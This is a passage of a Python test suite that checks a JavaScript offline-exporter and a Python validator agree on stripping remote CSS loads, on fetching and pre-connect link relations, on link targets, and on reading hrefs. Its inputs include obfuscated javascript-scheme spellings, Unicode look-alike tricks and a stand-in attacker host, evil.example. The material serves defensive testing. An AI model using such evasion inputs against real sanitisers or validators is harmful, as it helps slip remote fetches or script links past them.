            self._runtime_css_strip_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.corpus.map(s=>_offlineCssNoNetwork(s))));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the CSS strip: %s" % proc.stderr)
        stripped = json.loads(proc.stdout)
        self.assertEqual(len(stripped), len(self._CSS_NETWORK_CORPUS),
                         "node returned %d results for %d samples"
                         % (len(stripped), len(self._CSS_NETWORK_CORPUS)))
        for (css, expected), out in zip(self._CSS_NETWORK_CORPUS, stripped):
            self.assertEqual(
                out != css, expected,
                "the runtime's _offlineCssNoNetwork %s %r, so the strip and the validator's CSS "
                "gates have diverged. A stylesheet only one of them calls a network load is "
                "either a remote fetch the gate blesses, or an exported file its own --strict run "
                "rejects." % ("rewrote" if out != css else "left", css))
            if expected:
                self.assertNotIn(
                    "evil.example", out,
                    "the runtime's _offlineCssNoNetwork changed %r but left the remote host "
                    "behind, so the exported stylesheet still fetches" % css)
            # A false hit must cost at most the declaration it sits in. Any row that carries a
            # `.keep`/`.rest` marker after the reference asserts that marker survives, so neither
            # strip can run away with the rest of the stylesheet.
            for marker in (".keep{", ".rest{", "local-safe.css"):
                if marker in css:
                    self.assertIn(
                        marker, out,
                        "the exporter's CSS strip swallowed %r out of %r, so a single reference "
                        "took unrelated author CSS with it" % (marker, css))
            # The real contract is a FIXED POINT, not merely "the strip changed something": what
            # the export emits has to pass the gate it is measured by. Asserting only `out != css`
            # is satisfied by a strip that removes part of a reference and leaves the rest, which
            # is exactly the shape an unterminated `url(` used to produce.
            self.assertFalse(
                resources.CSS_NETWORK_URL_RE.search(out)
                or resources.CSS_NETWORK_IMPORT_RE.search(out),
                "the gate still reports %r after the exporter's own strip ran on %r, so "
                "`validate.py --strict` would reject the file the export just produced"
                % (out, css))


    # The `rel` spellings the two fetching-`<link>` readings must agree about. The export deletes a
    # network `<link>` whose relation makes it FETCH, and the strict validator reports the same
    # link, so a relation only ONE side reads as fetching is either a live preconnect the gate
    # certifies as offline-clean or an exported file its own `--strict` run rejects - the
    # CMH-OFFLINE-04 shape. The separators are half the point: HTML tokenizes a `rel` list on ASCII
    # whitespace ONLY, while a JS `\s` takes U+FEFF and Python's argument-less `str.split()` takes
    # U+001C-U+001F, and both take NBSP and the vertical tab - so each of those characters made one
    # side see two tokens where the other saw one.
    _LINK_REL_CORPUS = [
        ("stylesheet", True), ("STYLESHEET", True), ("StyleSheet", True),
        ("preload", True), ("modulepreload", True), ("prefetch", True), ("prerender", True),
        ("preconnect", True), ("dns-prefetch", True), ("icon", True), ("manifest", True),
        ("apple-touch-icon", True),
        # The relation the exporter's list was missing outright: the strip KEPT such a link while
        # the gate reported it, so the export produced a file its own `--strict` run rejects.
        ("apple-touch-icon-precomposed", True), ("Apple-Touch-Icon-Precomposed", True),
        ("alternate stylesheet", True), ("icon\nstylesheet", True), ("\ficon", True),
        ("stylesheet\rx", True), ("x\ticon", True), ("  icon  ", True),
        ("", False), ("   ", False), ("author", False), ("noopener noreferrer", False),
        ("stylesheeticon", False), ("apple-touch-icon-precomposedx", False),
        # Separators that are NOT HTML ASCII whitespace: a browser reads one token, and that token
        # is no relation at all, so neither side may split here.
        ("stylesheet\u001cx", False), ("stylesheet\u001fx", False), ("stylesheet\ufeffx", False),
        ("stylesheet\u00a0x", False), ("stylesheet\u000bx", False), ("icon\u2028x", False),
        ("icon\u3000x", False), ("icon\u0085x", False),
        # ...and the CASE-folding half of the same pin. Both sides fold ASCII-only, because each
        # engine's own Unicode fold maps a look-alike onto a real relation (Python's `str.lower()`
        # takes U+212A to `k` and `re.IGNORECASE` folds U+017F onto `s`; a JS `toLowerCase()` has
        # its own table), so a one-sided return to either would make one side see a relation the
        # other cannot. None of these is a relation to a browser.
        ("\u017ftylesheet", False), ("i\u212aon", False), ("STYLESHEET\u0130", False),
        ("\u212aicon", False),
    ]

    def _runtime_link_rel_source(self):
        """The exporter's whole fetching-`<link>` decision, as JS source, for evaluation in node.

        Extracted as one contiguous region - the relation set, the tokenizer and the predicate
        together - because reading only the set would keep passing after the tokenizer drifted,
        which is exactly half of what this parity check exists to catch.
        """
        source = self._read("68-export-offline.js")
        start = source.find("const _OFFLINE_FETCHING_LINK_RELS")
        self.assertNotEqual(start, -1,
                            "the runtime no longer declares _OFFLINE_FETCHING_LINK_RELS; the "
                            "parity extraction is stale and must be re-pointed at what replaced it")
        m = re.compile(r"function _offlineLinkLoads\(rel\) \{.*?\n\}", re.S).search(source, start)
        self.assertIsNotNone(m, "the runtime no longer declares _offlineLinkLoads after the "
                                "relation set; the parity extraction is stale")
        region = source[start:m.end()]
        for name in ("_OFFLINE_FETCHING_LINK_RELS", "_OFFLINE_REL_WS_RE",
                     "_offlineLinkRelTokens", "_offlineLinkLoads"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted link-relation region, so the "
                          "parity check would run a partial copy of the decision" % name)
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted link-relation region has unbalanced braces, so it was cut "
                         "mid-function and the parity check would evaluate a truncated copy")
        return region

    def test_the_python_and_js_fetching_link_relation_sets_are_identical(self):
        """Pin the two relation sets as TEXT, not only by the corpus verdicts.

        A corpus proves the two sides agree on the spellings it carries; it cannot prove the SETS
        are the same, and `apple-touch-icon-precomposed` is the proof - it sat in the validator's
        set and not in the exporter's until a sample happened to name it. Comparing the lists
        directly is what makes a future one-sided addition fail immediately.
        """
        source = self._read("68-export-offline.js")
        m = re.search(r"const _OFFLINE_FETCHING_LINK_RELS = (\[[^\]]*\]);", source)
        self.assertIsNotNone(m, "the runtime no longer declares _OFFLINE_FETCHING_LINK_RELS as a "
                                "plain array literal, so this pin cannot read it")
        try:
            js_rels = json.loads(m.group(1))
        except ValueError:
            self.fail("the runtime's _OFFLINE_FETCHING_LINK_RELS is not a JSON-compatible array "
                      "literal; keeping it one is what lets the two sides be compared")
        self.assertEqual(sorted(js_rels), sorted(parsing.FETCHING_LINK_RELS),
                         "the exporter's fetching-link relations and the validator's "
                         "FETCHING_LINK_RELS have drifted. A relation only the GATE knows is a "
                         "link the export keeps and its own --strict run then rejects; one only "
                         "the STRIP knows is a link the export deletes and the gate blesses.")
        self.assertEqual(len(js_rels), len(set(js_rels)),
                         "the exporter's relation list carries a duplicate, so the two sets were "
                         "compared as multisets rather than as sets")

    def test_the_python_and_js_speculative_link_relation_decisions_agree(self):
        """The offline strip (JS) and the strict validator (Python) must call the SAME `<link>` a
        speculative-connection hint, and agree on what is LEFT of a mixed `rel`.

        This pair is removed UNCONDITIONALLY rather than for a network href (#1076), so a rel only
        one side reads as a hint is either a beacon the gate certifies or an author's link the
        export deletes - and the rel the strip WRITES BACK on a mixed list has to be one the gate
        then accepts, or the exporter produces a file its own `--strict` run rejects. Evaluated in
        node for the same reason the fetching pair is: the two engines fold case and split
        whitespace differently, and that difference is what this pins.
        """
        source = self._read("68-export-offline.js")
        m = re.search(r"const _OFFLINE_SPECULATIVE_LINK_RELS = (\[[^\]]*\]);", source)
        self.assertIsNotNone(m, "the runtime no longer declares _OFFLINE_SPECULATIVE_LINK_RELS as a "
                                "plain array literal, so this pin cannot read it")
        js_rels = json.loads(m.group(1))
        self.assertEqual(sorted(js_rels), sorted(parsing.SPECULATIVE_LINK_RELS),
                         "the exporter's speculative-connection relations and the validator's "
                         "SPECULATIVE_LINK_RELS have drifted. A relation only the GATE knows makes "
                         "the gate reject a file the export just wrote; one only the STRIP knows "
                         "deletes an author's link the gate would have kept.")
        self.assertTrue(set(parsing.SPECULATIVE_LINK_RELS) < set(parsing.FETCHING_LINK_RELS),
                        "the speculative relations must stay a strict SUBSET of the fetching ones: "
                        "they are removed unconditionally, and the loader pass reads the rest")
        corpus = [
            # (rel, is a hint, what is left of the rel - None means the element goes)
            ("preconnect", True, None), ("dns-prefetch", True, None),
            ("PRECONNECT", True, None), ("DNS-Prefetch", True, None),
            ("preconnect dns-prefetch", True, None), ("  preconnect  ", True, None),
            ("preconnect\tdns-prefetch", True, None), ("preload\npreconnect", True, "preload"),
            ("alternate preconnect", True, "alternate"),
            ("preconnect stylesheet", True, "stylesheet"),
            ("stylesheet PRECONNECT icon", True, "stylesheet icon"),
            ("", False, None), ("   ", False, None), ("stylesheet", False, "stylesheet"),
            ("preconnects", False, "preconnects"), ("pre-connect", False, "pre-connect"),
            ("dnsprefetch", False, "dnsprefetch"),
            # separators HTML does not honor: one opaque token, so no hint on either side
            ("preconnect\u00a0x", False, "preconnect\u00a0x"),
            ("preconnect\u001cx", False, "preconnect\u001cx"),
            ("preconnect\ufeffx", False, "preconnect\ufeffx"),
            ("preconnect\u000bx", False, "preconnect\u000bx"),
            # ...and case look-alikes an engine's Unicode fold would turn into a relation
            ("preconne\u212at", False, "preconne\u212at"),
        ]
        for rel, expected, _kept in corpus:
            self.assertEqual(
                resources._link_speculates({"rel": rel}), expected,
                "the validator reads rel=%r as %s; HTML tokenizes a rel list on ASCII whitespace "
                "only and matches a relation ASCII case-insensitively"
                % (rel, "not a hint" if expected else "a hint"))
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        region = self._runtime_link_rel_source()
        speculative = re.search(
            r"const _OFFLINE_SPECULATIVE_LINK_RELS = \[[^\]]*\];.*?"
            r"function _offlineRelWithoutHints\(rel\) \{.*?\n\}", source, re.S)
        self.assertIsNotNone(speculative, "the runtime no longer declares the speculative relation "
                                          "set followed by _offlineRelWithoutHints; the parity "
                                          "extraction is stale")
        script = (
            region + "\n" + speculative.group(0) + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.corpus.map(s=>[_offlineLinkSpeculates(s),_offlineRelWithoutHints(s)])));});"
        )
        proc = subprocess.run([node, "-e", script],
                              input=json.dumps({"corpus": [rel for rel, _, _ in corpus]}),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the speculative-link decision: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(corpus),
                         "node returned %d verdicts for %d samples" % (len(verdicts), len(corpus)))
        for (rel, expected, kept), (js_says, js_kept) in zip(corpus, verdicts):
            self.assertEqual(js_says, expected,
                             "the exporter reads rel=%r as %s while the validator does not; the "
                             "strip and the gate must agree about what a hint is"
                             % (rel, "a hint" if js_says else "not a hint"))
            self.assertEqual(js_kept, kept,
                             "the exporter rewrites rel=%r to %r, expected %r. What it writes back "
                             "must carry no hint (or the gate rejects the exported file) and must "
                             "keep every other relation (or an author's reference is lost)."
                             % (rel, js_kept, kept))

    # (own `target` attribute or None, first `<base target>` value or None) -> the EFFECTIVE target
    # HTML resolves. The two sides must agree on every row or the render-time stamp and the
    # `cmh-kql-run` gate disagree about which links open an auxiliary browsing context.
    _EFFECTIVE_TARGET_CORPUS = [
        # The plain readings: the anchor's own value wins, absent inherits the base, and absent on
        # both is the empty (current-context) value.
        ("_blank", None), ("_self", None), ("", None), (None, None),
        (None, "_blank"), (None, "_BLANK"), (None, "_self"), (None, "win1"), (None, ""),
        # An OWN value wins over the base in both directions, including an explicitly empty one -
        # HTML falls through to the base only when the attribute is ABSENT.
        ("_self", "_blank"), ("_blank", "_self"), ("", "_blank"), ("win1", "_blank"),
        # The `<`-coercion: BOTH an ASCII tab-or-newline and a U+003C, in either order, anywhere.
        ("x\n<", None), ("<\tx", None), ("a\rb<c", None), ("<\n", None),
        (None, "x\n<"),  # ...applied to an INHERITED value too
        # ...and the near misses, which are ordinary names: one character without the other, and
        # separators that are NOT an HTML ASCII tab-or-newline (a JS `\s` and a Python `\s` both
        # take the vertical tab and the form feed; Python's also takes U+001C-U+001F, and a JS
        # `\s` also takes NBSP, U+FEFF and the Unicode Zs class).
        ("x<", None), ("x\ny", None), ("<", None), ("\n", None),
        ("x\u000b<", None), ("x\u000c<", None), ("x\u00a0<", None), ("x\u001c<", None),
        ("x\ufeff<", None), ("x\u2028<", None), ("x\u0085<", None),
        (None, "x\u000b<"), (None, "x<"),
        # Case is NOT folded by this reading - each side folds when it matches the keyword, so a
        # fold here would be a second, divergent one. The padded and case-variant pseudo-keywords
        # are here because the RUNTIME's keyword match is deliberately broader than HTML's (it
        # trims and Unicode-lowercases the result, which only ever stamps MORE links): the shared
        # reading must hand both sides the same value, and the broadening must live on one side
        # only.
        ("_BLANK", None), ("X\n<", None),
        (" _blank ", None), (None, " _blank "), (None, "\t_BLANK\n"), (None, "_BLAN\u212a"),
    ]

    def _runtime_effective_target_source(self):
        """The runtime's whole effective-target reading, as JS source, for evaluation in node.

        Extracted as one contiguous region - the coercion class and the function together - because
        reading only the class would keep passing after the function drifted.
        """
        source = self._read("31-links.js")
        start = source.find("const _CMH_TARGET_COERCE_WS_RE")
        self.assertNotEqual(start, -1,
                            "the runtime no longer declares _CMH_TARGET_COERCE_WS_RE; the parity "
                            "extraction is stale and must be re-pointed at what replaced it")
        m = re.compile(r"function _cmhEffectiveTarget\(own, base\) \{.*?\n\}", re.S).search(source, start)
        self.assertIsNotNone(m, "the runtime no longer declares _cmhEffectiveTarget after the "
                                "coercion class; the parity extraction is stale")
        region = source[start:m.end()]
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted effective-target region has unbalanced braces, so it was "
                         "cut mid-function and the parity check would evaluate a truncated copy")
        return region

    def test_the_python_and_js_target_coercion_classes_are_textually_identical(self):
        """The `<`-coercion whitespace class is a hand-copied literal in two languages, so pin its
        TEXT.

        Verdicts over a corpus cannot see a class that drifted on a character the corpus does not
        carry, and this class exists precisely because neither engine's own whitespace is HTML's
        "ASCII tab or newline".
        """
        source = self._read("31-links.js")
        m = re.search(r"const _CMH_TARGET_COERCE_WS_RE = /(.*?)/;", source)
        self.assertIsNotNone(m, "the runtime no longer declares _CMH_TARGET_COERCE_WS_RE; the parity "
                                "pin must be re-pointed at whatever coerces a target now")
        self.assertEqual(m.group(1), parsing.TARGET_COERCE_WS_RE.pattern,
                         "the stamper coerces a target on %r while the validator coerces on %r; a "
                         "character only one of them counts makes one side call a link a new tab "
                         "the other reads as a named context"
                         % (m.group(1), parsing.TARGET_COERCE_WS_RE.pattern))

    def test_the_python_and_js_effective_target_readings_agree(self):
        """The render-time stamper (JS) and the `cmh-kql-run` gate (Python) must resolve the SAME
        effective target.

        Run in node rather than re-implemented here, for the same reason the `rel` pair is: the two
        engines disagree about whitespace, and an engine difference is exactly what this pins.
        Skipped when node is absent, like the other node-gated checks.
        """
        expected = [parsing.effective_link_target(own, base)
                    for own, base in self._EFFECTIVE_TARGET_CORPUS]
        # The absent value is spelled "" on both sides, never None/null, so a caller can fold it.
        for value in expected:
            self.assertIsInstance(value, str)
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {"corpus": [list(pair) for pair in self._EFFECTIVE_TARGET_CORPUS]}
        script = (
            self._runtime_effective_target_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.corpus.map(a=>_cmhEffectiveTarget(a[0]===null?null:a[0],a[1]===null?null:a[1]))));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the effective-target reading: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(self._EFFECTIVE_TARGET_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(self._EFFECTIVE_TARGET_CORPUS)))
        for (own, base), js_says, py_says in zip(self._EFFECTIVE_TARGET_CORPUS, verdicts, expected):
            self.assertEqual(
                js_says, py_says,
                "target=%r with <base target>=%r resolves to %r in the runtime and %r in the "
                "validator. A link only one of them calls _blank is either a new tab the gate "
                "blesses without rel=noopener or a named context the stamper newly breaks."
                % (own, base, js_says, py_says))

    _URL_ENDS_TRIM_CORPUS = [
        # Nothing to trim.
        "", "#frag", "https://example.com/x", "mailto:x@example.com",
        # The characters the URL parser trims (C0 controls and space) - alone, leading, trailing.
        " ", "\t", "\n", "\r", "\u000b", "\u000c", "\u0000", "\u0001", "\u001f", "\u0020",
        " #frag", "\t#frag", "\u0001#frag", "#frag ", "#frag\u0001", "\u0001#frag\u0001",
        "\u0001\u0002\u0003", " \t\r\n ",
        # The characters JS `.trim()` takes and the parser KEEPS - the half that caused #1170.
        "\u00a0", "\u00a0#frag", "\u2028#frag", "\u2029#frag", "\u3000#frag", "\ufeff#frag",
        "\u0085#frag", "\u1680#frag", "\u2000#frag", "\u200a#frag", "\u202f#frag", "\u205f#frag",
        "#frag\u00a0", "\u00a0#frag\u00a0",
        # Mixed: a kept character behind a trimmed one, and the reverse.
        "\u0001\u00a0#frag", "\u00a0\u0001#frag", " \u00a0 ",
        # Non-BMP and a lone surrogate: neither side may mangle what it does not trim.
        "\U0001f600#frag", "\ud800#frag", " \ud800 ",
    ]

    def _runtime_url_ends_trim_source(self):
        """The runtime's whole URL end-trim reading, as JS source, for evaluation in node.

        Extracted as one contiguous region - the class and the function together - for the same
        reason the effective-target extraction is: reading only the class would keep passing after
        the function drifted.
        """
        source = self._read("31-links.js")
        start = source.find("const _CMH_URL_ENDS_TRIM_RE")
        self.assertNotEqual(start, -1,
                            "the runtime no longer declares _CMH_URL_ENDS_TRIM_RE; the parity "
                            "extraction is stale and must be re-pointed at what trims an href now")
        m = re.compile(r"function _cmhUrlEndsTrim\(value\) \{.*?\n\}", re.S).search(source, start)
        self.assertIsNotNone(m, "the runtime no longer declares _cmhUrlEndsTrim after the trim "
                                "class; the parity extraction is stale")
        region = source[start:m.end()]
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted URL end-trim region has unbalanced braces, so it was cut "
                         "mid-function and the parity check would evaluate a truncated copy")
        return region

    def test_the_python_and_js_url_end_trim_classes_cover_the_same_characters(self):
        """The URL parser's end trim is a hand-copied character set in two languages, so pin the
        whole regex TEXT.

        A corpus cannot see a class that drifted on a character the corpus does not carry, and this
        set exists precisely because neither engine's own trim is the parser's: JS `.trim()` reaches
        past ASCII into NBSP/U+2028/Zs/U+FEFF and Python's `str.strip()` reaches the same way, while
        the parser trims C0 controls and space and nothing else.
        """
        source = self._read("31-links.js")
        m = re.search(r"const _CMH_URL_ENDS_TRIM_RE = /(.*?)/g;", source)
        self.assertIsNotNone(m, "the runtime no longer declares _CMH_URL_ENDS_TRIM_RE as a global "
                                "regex literal; the parity pin must be re-pointed at whatever trims "
                                "an href now")
        low, high = ord(parsing._URL_ENDS_TRIM[0]), ord(parsing._URL_ENDS_TRIM[-1])
        self.assertEqual(parsing._URL_ENDS_TRIM,
                         "".join(chr(c) for c in range(low, high + 1)),
                         "the validator's trim is no longer one contiguous range, so the JS class "
                         "below cannot be derived from its endpoints; pin the two sets directly")
        # The WHOLE regex body, not just the ranges inside it: a `findall` of the ranges is blind to
        # anything ADDED beside them (a `|[\u007f]+$` alternative, an extra singleton in the class),
        # and the corpus test cannot see a character it does not carry either.
        expected = "^[\\u%04x-\\u%04x]+|[\\u%04x-\\u%04x]+$" % (low, high, low, high)
        self.assertEqual(m.group(1), expected,
                         "the runtime trims an href's ends with /%s/ while the validator trims "
                         "U+%04X-U+%04X and nothing else; a character only one of them takes makes "
                         "one side call a link a same-page fragment the other reads as a document "
                         "reference" % (m.group(1), low, high))

    def test_the_python_and_js_url_end_trim_readings_agree(self):
        """The render-time link classifier (JS) and the new-tab gate (Python) must trim an href's
        ENDS identically.

        This is the twin that #1170 exists because of: the runtime read an href with JS `.trim()`
        while the validator read it with the parser's trim, so one of them called
        `href="&#xa0;#frag"` a same-page fragment and the other a document reference. Run in node
        rather than re-implemented here, for the same reason the effective-target pair is: the two
        engines disagree about whitespace, and an engine difference is exactly what this pins.
        Skipped when node is absent, like the other node-gated checks.
        """
        expected = [parsing.url_ends_trim(value) for value in self._URL_ENDS_TRIM_CORPUS]
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        script = (
            self._runtime_url_ends_trim_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.corpus.map(v=>_cmhUrlEndsTrim(v))));});"
        )
        proc = subprocess.run([node, "-e", script],
                              input=json.dumps({"corpus": self._URL_ENDS_TRIM_CORPUS}),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the URL end-trim reading: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(self._URL_ENDS_TRIM_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(self._URL_ENDS_TRIM_CORPUS)))
        for value, js_says, py_says in zip(self._URL_ENDS_TRIM_CORPUS, verdicts, expected):
            self.assertEqual(
                js_says, py_says,
                "href %r trims to %r in the runtime and %r in the validator. An href only one of "
                "them empties, or only one of them leaves starting with '#', is a link the stamper "
                "and the authoring gate disagree about opening in a new tab."
                % (value, js_says, py_says))

    # (href, base URL) rows the runtime's `new URL(a.href, document.baseURI)` cannot RESOLVE, so its
    # classifier falls through to the string reading this pins to `_is_document_reference`. Two
    # populations, not one: an href the parser REJECTS (only an absolute reference with an authority
    # can fail that way, and only three ways - an unterminated IPv6 host, a forbidden host code point
    # `%`, and an empty host for a special scheme), and any RELATIVE reference in a document whose
    # base URL has an opaque path, which has no base to resolve against. Every row is checked to be
    # genuinely unresolvable before its verdict is compared, so the corpus can never quietly stop
    # exercising the fallback branch it exists for.
    #
    # The base matters only to that check - the validator classifies an href with no base at all -
    # but it must be the base the row really fails under: a space in a host (`http://a b`) makes
    # node throw and Chromium PERCENT-ENCODE, so such a row would assert a fallback the real runtime
    # never takes. Rows here are ones both engines refuse.
    _OPAQUE_BASE = "about:blank"
    _FILE_BASE = "file:///report.html"
    _UNPARSEABLE_HREF_CORPUS = [
        # Document schemes: unparseable or not, a click on one leaves the report.
        ("http://[", _FILE_BASE), ("https://[", _FILE_BASE), ("file://[", _FILE_BASE),
        ("http://%", _FILE_BASE), ("file://%", _FILE_BASE), ("https://?", _FILE_BASE),
        ("http://[/x", _FILE_BASE), ("http://[]", _FILE_BASE),
        # No scheme at all - it inherits the document's, so it is a document reference too.
        ("//[", _FILE_BASE),
        # Non-document schemes: exempt here exactly as their parseable spellings are.
        ("mailto://[", _FILE_BASE), ("javascript://[", _FILE_BASE), ("data://[", _FILE_BASE),
        ("tel://[", _FILE_BASE), ("foo://[", _FILE_BASE), ("blob://[", _FILE_BASE),
        # The paddings the parser's own input cleanup removes. Both cleanups are load-bearing: with
        # no END TRIM `<SP>foo://[` reads as scheme-less (a document reference) instead of `foo:`,
        # and with no INNER STRIP `ja<TAB>vascript://[` does the same.
        (" foo://[", _FILE_BASE), ("\u0001foo://[", _FILE_BASE), ("foo://[ ", _FILE_BASE),
        ("foo://[\u0001", _FILE_BASE), ("ja\tvascript://[", _FILE_BASE),
        ("h\ttp://[", _FILE_BASE), ("\rhttp://[\n", _FILE_BASE), ("\u0001//[", _FILE_BASE),
        # The second population: an ordinary relative reference under an OPAQUE base. Nothing is
        # wrong with these hrefs - they are the everyday links of a report - and the fallback is the
        # only reading they get, so the widened contract is pinned rather than incidental.
        ("guide.html", _OPAQUE_BASE), ("/abs.html", _OPAQUE_BASE), ("//host/x", _OPAQUE_BASE),
        ("x?q", _OPAQUE_BASE),
        # The other two opaque-base shapes the comment, the spec row and the changelog all name, so
        # the prose is pinned rather than asserted.
        ("guide.html", "blob:https://example.com/1234"), ("//host/x", "blob:https://example.com/1234"),
        ("guide.html", "data:text/html,x"), ("/abs.html", "data:text/html,x"),
    ]

    # The rest of the reading, which the corpus above structurally CANNOT reach: every row there
    # must make `new URL()` fail, and the empty href, a `#fragment` and an ordinary `path/to:x` all
    # resolve fine. Their verdicts are still part of the mirror - the `""`/`#` short-circuit, the
    # ASCII case fold, and the scheme regex's exclusion of `/`, `?` and `#` - so they are pinned
    # here against the same validator function, without the unresolvable precondition.
    _HREF_READING_CORPUS = [
        "", " ", "\u0001", "\t", "#", "#frag", " #frag", "\u0001#frag", "\u00a0#frag",
        "path/to:x", "a?b:c", "x#y:z", "./rel", "/root", "//host/x", "guide.html",
        "HTTP://x", "HtTpS://x", "FILE:///x", "MAILTO:x", "JavaScript:void(0)",
        "http:", "https:", "file:", "mailto:x", "tel:+1", "data:text/html,x", "blob:x",
        "h\ttp://x", "ja\tvascript:void(0)", " mailto:x", "\u0001mailto:x", "mailto:x ",
    ]

    def _runtime_document_reference_source(self):
        """The runtime's whole unparseable-href reading, as JS source, for evaluation in node.

        Extracted as one contiguous region - the character classes, the scheme list and both
        functions - for the same reason the effective-target extraction is: reading only the classes
        would keep passing after the reading that uses them drifted.
        """
        source = self._read("31-links.js")
        self.assertEqual(source.count("const _CMH_URL_ENDS_TRIM_RE"), 1,
                         "the runtime declares _CMH_URL_ENDS_TRIM_RE more than once, so this "
                         "extraction may read a copy the bundle never uses (and a duplicate "
                         "top-level const is a bundle-wide SyntaxError)")
        start = source.find("const _CMH_URL_ENDS_TRIM_RE")
        self.assertNotEqual(start, -1,
                            "the runtime no longer declares _CMH_URL_ENDS_TRIM_RE; the parity "
                            "extraction is stale and must be re-pointed at what reads an href now")
        m = re.compile(r"function _cmhHrefIsDocumentReference\(href\) \{.*?\n\}", re.S).search(source, start)
        self.assertIsNotNone(m, "the runtime no longer declares _cmhHrefIsDocumentReference after "
                                "the URL classes; the parity extraction is stale")
        region = source[start:m.end()]
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted document-reference region has unbalanced braces, so it was "
                         "cut mid-function and the parity check would evaluate a truncated copy")
        return region

    def test_the_python_and_js_href_reading_classes_are_textually_identical(self):
        """The three hand-copied character sets behind the href reading, pinned as TEXT.

        A corpus cannot see a class that drifted on a character the corpus does not carry, and one
        of these is structurally UNREACHABLE by the corpus: to reach the fallback a row must make a
        real `new URL()` fail, which needs a valid scheme, so a character that would discriminate an
        inner-strip broadening (`[\\t\\n\\r]` -> `\\s`) has to sit BEFORE the scheme colon - where it
        stops the scheme parsing and the href resolves instead of throwing. The text pin is the only
        guard there, and it is the same guard the sibling `rel`-token and target-coercion classes
        already carry.
        """
        source = self._read("31-links.js")
        inner = re.search(r"const _CMH_URL_INNER_STRIP_RE = /(.*?)/g;", source)
        self.assertIsNotNone(inner, "the runtime no longer declares _CMH_URL_INNER_STRIP_RE as a "
                                    "global regex literal; the parity pin must be re-pointed")
        self.assertEqual(inner.group(1), links_check._URL_STRIP_RE.pattern,
                         "the runtime strips /%s/ from inside an href while the validator strips "
                         "/%s/; a character only one of them removes makes one side read an "
                         "obfuscated scheme the other does not"
                         % (inner.group(1), links_check._URL_STRIP_RE.pattern))
        scheme = re.search(r"const _CMH_HREF_SCHEME_RE = /\^(.*?)/;", source)
        self.assertIsNotNone(scheme, "the runtime no longer declares _CMH_HREF_SCHEME_RE as an "
                                     "anchored regex literal; the parity pin must be re-pointed")
        self.assertEqual(scheme.group(1), links_check._SCHEME_RE.pattern,
                         "the runtime matches a scheme with /%s/ while the validator matches /%s/; "
                         "the validator's is applied with re.match, so the runtime's must be the "
                         "same pattern anchored at the start and nothing more"
                         % (scheme.group(1), links_check._SCHEME_RE.pattern))
        ends = re.search(r"const _CMH_URL_ENDS_TRIM_RE = /(.*?)/g;", source)
        self.assertIsNotNone(ends, "the runtime no longer declares _CMH_URL_ENDS_TRIM_RE as a "
                                   "global regex literal; the parity pin must be re-pointed")
        low, high = ord(parsing._URL_ENDS_TRIM[0]), ord(parsing._URL_ENDS_TRIM[-1])
        self.assertEqual(parsing._URL_ENDS_TRIM, "".join(chr(c) for c in range(low, high + 1)),
                         "the validator's end trim is no longer one contiguous range, so the JS "
                         "class below cannot be derived from its endpoints; pin the two directly")
        self.assertEqual(ends.group(1),
                         "^[\\u%04x-\\u%04x]+|[\\u%04x-\\u%04x]+$" % (low, high, low, high),
                         "the runtime trims an href's ends with /%s/ while the validator trims "
                         "U+%04X-U+%04X and nothing else" % (ends.group(1), low, high))
        doc = re.search(r"const _CMH_DOC_SCHEMES = \[(.*?)\];", source)
        self.assertIsNotNone(doc, "the runtime no longer declares _CMH_DOC_SCHEMES as a single-line "
                                  "array literal; the parity pin must be re-pointed at whatever "
                                  "names the document schemes now")
        self.assertEqual(doc.group(1), ", ".join('"%s"' % s for s in links_check._DOC_SCHEMES),
                         "the runtime's document-scheme set (order included) has drifted from the "
                         "validator's %r"
                         % (links_check._DOC_SCHEMES,))

    def test_the_unparseable_href_fallback_is_the_one_the_classifier_uses(self):
        """The classifier's `catch` branch must RETURN the shared reading, and there must be exactly
        ONE classifier to return it from.

        The corpus check below evaluates `_cmhHrefIsDocumentReference` on its own, so it would stay
        green if the `catch` went back to reading `a.protocol` and left the function unused - which
        is exactly the state #1183 fixed. The declaration COUNT is pinned beside it because a
        redeclared function is legal JS: a second copy shipped into every artifact once, the LATER
        one is what runs, and a text pin that reads the first would then guard dead code.
        """
        source = self._read("31-links.js")
        decls = re.findall(r"function _cmhCommentableLink\(a\) \{.*?\n\}", source, re.S)
        self.assertEqual(len(decls), 1,
                         "the runtime declares _cmhCommentableLink %d times; a redeclaration is "
                         "legal JS and the LAST one is what runs, so the pin below would read a "
                         "copy the browser never executes" % len(decls))
        self.assertRegex(
